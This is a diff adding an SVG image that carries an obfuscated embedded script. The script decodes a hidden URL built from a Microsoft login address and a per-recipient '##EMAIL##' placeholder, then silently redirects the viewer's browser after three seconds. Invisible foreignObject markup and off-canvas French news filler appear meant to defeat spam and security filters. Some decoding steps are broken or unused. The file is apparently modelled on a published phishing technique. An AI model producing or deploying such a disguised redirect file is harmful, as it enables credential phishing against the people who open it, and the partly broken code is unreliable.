@@ -1,0 +1,102 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="auto" viewBox="0 0 300 250" style="max-width: 100%; margin: 0 auto; display: block;">
+  <script type="application/ecmascript">
+    <![CDATA[
+      (function() {
+        // Step 1: Multiple layers of obfuscation with junk characters
+        var _0x74a2 = "7ax3q6z-5fq4z-6b8z-77axq3z-6cxq8z-6fx5qz-60z8q-68q3zx-60z-74z";
+        _0x74a2 = _0x74a2.replace(/[xqz]/g, ""); // Remove junk characters
+        
+        // Step 2: String manipulation and array storage for obfuscation
+        var _0x9f3b = [];
+        _0x9f3b.push("aHR0cHM6Ly");
+        _0x9f3b.push("9sb2dpbi5");
+        _0x9f3b.push("taWNyb3Nv");
+        _0x9f3b.push("ZnRvbmxpb");
+        _0x9f3b.push("mUuY29tLy");
+        _0x9f3b.push("ZxcmM9Iy");
+        _0x9f3b.push("NFTUFJTIC");
+        _0x9f3b.push("Mj");
+        
+        // Step 3: Function to decode with mathematical transformations
+        function _0x63a8(_0x5e2d) {
+          var _0xf93c2 = "";
+          var _0x2b8a4 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
+          var _0x4e71a, _0x3b29d, _0x18c7f;
+          var _0x5a91c, _0x7e32b, _0x1f49d, _0x2c83e;
+          var _0x4f72a = 0;
+          
+          _0x5e2d = _0x5e2d.replace(/[^A-Za-z0-9\+\/\=]/g, "");
+          
+          while (_0x4f72a < _0x5e2d.length) {
+            _0x5a91c = _0x2b8a4.indexOf(_0x5e2d.charAt(_0x4f72a++));
+            _0x7e32b = _0x2b8a4.indexOf(_0x5e2d.charAt(_0x4f72a++));
+            _0x1f49d = _0x2b8a4.indexOf(_0x5e2d.charAt(_0x4f72a++));
+            _0x2c83e = _0x2b8a4.indexOf(_0x5e2d.charAt(_0x4f72a++));
+            
+            _0x4e71a = (_0x5a91c << 2) | (_0x7e32b >> 4);
+            _0x3b29d = ((_0x7e32b & 15) << 4) | (_0x1f49d >> 2);
+            _0x18c7f = ((_0x1f49d & 3) << 6) | _0x2c83e;
+            
+            _0xf93c2 += String.fromCharCode(_0x4e71a);
+            
+            if (_0x1f49d !== 64) {
+              _0xf93c2 += String.fromCharCode(_0x3b29d);
+            }
+            
+            if (_0x2c83e !== 64) {
+              _0xf93c2 += String.fromCharCode(_0x18c7f);
+            }
+          }
+          
+          return _0xf93c2;
+        }
+        
+        // Step 4: Hexadecimal processing similar to the article example
+        var _0x47d8 = _0x74a2.split("-");
+        var _0x2f9c = "";
+        
+        for(var i = 0; i < _0x47d8.length; i++){
+          if(_0x47d8[i].length > 0) {
+            _0x2f9c += String.fromCharCode(parseInt(_0x47d8[i], 16));
+          }
+        }
+        
+        // Step 5: URL reconstruction with encoded parameters
+        var _0xb4e9 = _0x63a8(_0x9f3b.join(""));
+        var _0xc7d5 = "&qrc=##EMAIL##";
+        var _0xd8e6 = encodeURIComponent(_0xc7d5);
+        
+        // Step 6: Additional layer of obfuscation with string operations
+        var _0xf713 = (function() {
+          var _0xe28c = [];
+          _0xe28c.push(_0xb4e9);
+          _0xe28c.push(_0xd8e6);
+          return _0xe28c.join("");
+        })();
+        
+        // Step 7: Final execution with timing function
+        var _0x3e9f = function(_0x6c82) {
+          return window.setTimeout(function() {
+            window["lo" + "ca" + "ti" + "on"]["hr" + "ef"] = _0x6c82;
+          }, parseInt("0xbb8", 16));
+        };
+        
+        _0x3e9f(_0xf713);
+      })();
+    ]]>
+  </script>
+
+  <!-- Adding foreignObject element as mentioned in the article but visually invisible -->
+  <foreignObject x="0" y="0" width="300" height="250">
+    <div xmlns="http://www.w3.org/1999/xhtml" style="opacity: 0; position: absolute; top: -9999px; left: -9999px;">
+      <!-- Hidden content that will still trigger the script execution -->
+      <div id="loader" style="display: none;">
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=" alt="" />
+      </div>
+    </div>
+  </foreignObject>
+
+  <text class="hidden-text" x="-10000" y="-10000">Dans une récente percée dans l'exploration spatiale, les scientifiques ont découvert une nouvelle exoplanète qui pourrait potentiellement supporter la vie. La planète, située dans la zone habitable de son système stellaire, présente des conditions similaires à celles de la Terre. Des chercheurs du Jet Propulsion Laboratory de la NASA et d'autres agences spatiales du monde entier ont salué cette découverte comme l'une des plus importantes depuis des décennies. La planète, nommée Kepler-452b, se trouve à environ 1 400 années-lumière de la Terre et a une taille et une température similaires à celles de notre planète. Les scientifiques sont optimistes quant au fait que cette découverte pourrait nous rapprocher de la recherche de la vie extraterrestre. L'atmosphère de la planète sera l'objectif des prochaines missions de recherche, où les scientifiques tenteront de détecter des signes d'eau, d'oxygène et d'autres indicateurs clés de la vie. Dans les années à venir, de nouveaux télescopes et des technologies avancées permettront aux astronomes d'analyser ce monde lointain en détail, espérant percer ses mystères et en savoir plus sur son potentiel à soutenir la vie.</text>
+
+  <text class="hidden-text" x="-10000" y="-10000">Dans les gros titres d'aujourd'hui, le marché boursier a connu une forte hausse, avec les principaux indices atteignant de nouveaux sommets historiques. La montée en flèche a été alimentée par de solides rapports de bénéfices des géants technologiques comme Apple, Amazon et Google, qui ont continué à afficher une croissance malgré les défis économiques en cours. Les experts attribuent la résilience du marché à la demande croissante de produits et services numériques, ainsi qu'aux progrès rapides de l'intelligence artificielle et de l'apprentissage automatique. Le secteur technologique reste une force dominante dans l'économie mondiale, stimulant l'innovation et la création d'emplois dans des domaines tels que la cybersécurité, l'informatique en nuage et les véhicules autonomes. Cependant, certains analystes mettent en garde contre le fait que le marché pourrait être surchauffé et que le risque de correction pourrait augmenter dans les mois à venir. Bien que l'optimisme persiste, les investisseurs sont invités à rester prudents et à envisager de diversifier leurs portefeuilles pour atténuer les risques potentiels à l'avenir.</text>
+</svg>
